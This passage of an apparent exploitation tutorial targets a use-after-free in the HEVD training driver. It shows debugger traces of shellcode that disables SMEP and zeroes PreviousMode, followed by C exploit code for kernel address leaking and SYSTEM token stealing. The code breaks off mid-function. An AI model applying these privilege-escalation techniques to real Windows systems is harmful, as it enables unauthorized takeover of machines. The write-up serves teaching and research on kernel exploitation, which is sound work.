+</div>
+<p>Shellcode loaded correctly before the gadget execution:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>10: kd&gt; t
+cng!BCryptHashData&#43;0x3ef3:
+fffff806`448867e3 e8f8ba0a00      call    fffff806`449322e0
+10: kd&gt; uu rax
+ffffb904`40aa2ef0 0f20e0          mov     rax,cr4
+ffffb904`40aa2ef3 4825ffffefff    and     rax,0FFFFFFFFFFEFFFFFh
+ffffb904`40aa2ef9 0f22e0          mov     cr4,rax
+ffffb904`40aa2efc 65488b042588010000 mov   rax,qword ptr gs:[188h]
+ffffb904`40aa2f05 c6803202000000  mov     byte ptr [rax&#43;232h],0
+ffffb904`40aa2f0c 4831c0          xor     rax,rax
+ffffb904`40aa2f0f 4883c408        add     rsp,8
+ffffb904`40aa2f13 c3              ret</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> SMEP Bypassed</li>
+<li><input checked="" disabled="" type="checkbox"> RAX with _KTHREAD Structure</li>
+</ul>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>10: kd&gt; dt nt!_KTHREAD @rax
+   &#43;0x000 Header           : _DISPATCHER_HEADER
+   &#43;0x018 SListFaultAddress : (null) 
+   &#43;0x020 QuantumTarget    : 0x713fb2c
+   &#43;0x028 InitialStack     : 0xffffd781`eb8aec90 Void
+   &#43;0x030 StackLimit       : 0xffffd781`eb8a9000 Void
+   &#43;0x038 StackBase        : 0xffffd781`eb8af000 Void
+   &#43;0x040 ThreadLock       : 0
+   &#43;0x048 CycleTime        : 0x13204c2
+   &#43;0x050 CurrentRunTime   : 0x81e1b
+   &#43;0x054 ExpectedRunTime  : 0x2f1ea9</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> PreviousMode set to 0</li>
+</ul>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>10: kd&gt; dt nt!_KTHREAD @rax PreviousMode
+   &#43;0x232 PreviousMode : 0 &#39;&#39;</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> No GS Cookie Crash</li>
+</ul>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>10: kd&gt; t
+ffffb904`40aa2f13 c3              ret
+10: kd&gt; t
+HEVD!UseUaFObjectNonPagedPool&#43;0x84:
+fffff806`48ca7cf4 33db            xor     ebx,ebx</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> No BSOD Screen
+<img src="image-7.png" alt="" loading="lazy" /></li>
+<li><input checked="" disabled="" type="checkbox"> Checking status of cmd.exe process</li>
+</ul>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><pre><code>0: kd&gt; !process 0 0 cmd.exe
+PROCESS ffffb10684cb2080
+    SessionId: 1  Cid: 0540    Peb: 8bf02ef000  ParentCid: 15dc
+    DirBase: 20e1ba000  ObjectTable: ffff8901b4eb0840  HandleCount:  75.
+    Image: cmd.exe
+
+0: kd&gt; dt nt!_KTHREAD ffffb10684cb2080 PreviousMode
+   &#43;0x232 PreviousMode : 0 &#39;&#39;</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>But anyways, here will appears the BSOD we shown before.</p>
+<h3>Final Code<span class="hx-absolute -hx-mt-20" id="final-code"></span>
+    <a href="#final-code" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Instead of pasting the whole C code with the file header, I will print out each functions and a brief explanation of what does, thus that it isn&rsquo;t illegible code.</p>
+<h4>Header file<span class="hx-absolute -hx-mt-20" id="header-file"></span>
+    <a href="#header-file" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL   IOCTL(0x804)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL        IOCTL(0x805)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x806)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL  IOCTL(0x807)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define UAF_OBJECT_DATA_SIZE   0x5C
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define UAF_CALLBACK_OFFSET    0x00
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define UAF_BUFFER_FIELD_SIZE  0x54
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define OFFSET_EPROCESS_PID    0x2e0
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define OFFSET_EPROCESS_LINKS  0x2e8
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define OFFSET_EPROCESS_TOKEN  0x358
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#pragma pack(push, 1)
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_FAKE_OBJECT_NON_PAGED_POOL</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Callback</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CHAR</span>  <span class="n">Buffer</span><span class="p">[</span><span class="n">UAF_BUFFER_FIELD_SIZE</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="o">*</span> <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#pragma pack(pop)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">static_assert</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span> <span class="o">==</span> <span class="n">UAF_OBJECT_DATA_SIZE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Size mismatch!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">_NtReadVirtualMemory</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">NumberOfBytesToRead</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PULONG</span> <span class="n">NumberOfBytesReaded</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">_NtWriteVirtualMemory</span><span class="p">)(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">BaseAddress</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">NumberOfBytesToWrite</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PULONG</span> <span class="n">NumberOfBytesWritten</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Object</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">UniqueProcessId</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">HandleValue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">GrantedAccess</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">USHORT</span> <span class="n">CreatorBackTraceIndex</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">USHORT</span> <span class="n">ObjectTypeIndex</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">HandleAttributes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">Reserved</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_HANDLE_INFORMATION_EX</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">NumberOfHandles</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">Reserved</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX</span> <span class="n">Handles</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_HANDLE_INFORMATION_EX</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_HANDLE_INFORMATION_EX</span><span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>getBaseAddr<span class="hx-absolute -hx-mt-20" id="getbaseaddr"></span>
+    <a href="#getbaseaddr" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Function code copy from <a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/" target="_blank" rel="noopener">https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/</a>.</p>
+<p>Useful to leak the some drivers/kernel base address:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ULONGLONG</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">drvName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">drivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">cbNeeded</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">nDrivers</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">drivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">cbNeeded</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">cbNeeded</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">WCHAR</span> <span class="n">szDrivers</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">nDrivers</span> <span class="o">=</span> <span class="n">cbNeeded</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nDrivers</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">GetDeviceDriverBaseName</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">szDrivers</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">wcscmp</span><span class="p">(</span><span class="n">szDrivers</span><span class="p">,</span> <span class="n">drvName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>GetSymbolAddr<span class="hx-absolute -hx-mt-20" id="getsymboladdr"></span>
+    <a href="#getsymboladdr" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Uses a local copy of ntoskrnl.exe as a reference to calculate how far a symbol is from the start of the file to apply that distance to the kernel&rsquo;s actual location in the system&rsquo;s running memory.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">GetSymbolAddr</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">base</span><span class="p">,</span> <span class="n">PCSTR</span> <span class="n">symbol</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HMODULE</span> <span class="n">hNtos</span> <span class="o">=</span> <span class="nf">LoadLibraryExA</span><span class="p">(</span><span class="s">&#34;ntoskrnl.exe&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">DONT_RESOLVE_DLL_REFERENCES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hNtos</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">pExport</span> <span class="o">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">hNtos</span><span class="p">,</span> <span class="n">symbol</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pExport</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">pExport</span> <span class="o">-</span> <span class="p">(</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">hNtos</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>PerformTokenStealing<span class="hx-absolute -hx-mt-20" id="performtokenstealing"></span>
+    <a href="#performtokenstealing" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>As the name suggests, it performs token hijacking by simulating an Arbitrary Read/Write.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">PerformTokenStealing</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">psInitialSystemProcessAddr</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">myPid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="nf">GetModuleHandleA</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_NtReadVirtualMemory</span> <span class="n">pNtRead</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtReadVirtualMemory</span><span class="p">)</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">&#34;NtReadVirtualMemory&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_NtWriteVirtualMemory</span> <span class="n">pNtWrite</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtWriteVirtualMemory</span><span class="p">)</span><span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">&#34;NtWriteVirtualMemory&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">currentEprocess</span> <span class="o">=</span> <span class="n">psInitialSystemProcessAddr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">systemToken</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">myEprocessAddr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Searching System and self EPROCESS...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">pNtRead</span><span class="p">(</span><span class="nf">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">currentEprocess</span> <span class="o">+</span> <span class="n">OFFSET_EPROCESS_TOKEN</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">systemToken</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] System Token found @ 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">systemToken</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">nextProcessLink</span> <span class="o">=</span> <span class="n">currentEprocess</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">pNtRead</span><span class="p">(</span><span class="nf">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG64</span><span class="p">)</span><span class="n">nextProcessLink</span> <span class="o">+</span> <span class="n">OFFSET_EPROCESS_PID</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">myPid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">myEprocessAddr</span> <span class="o">=</span> <span class="n">nextProcessLink</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] Self Token found @ 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">myEprocessAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
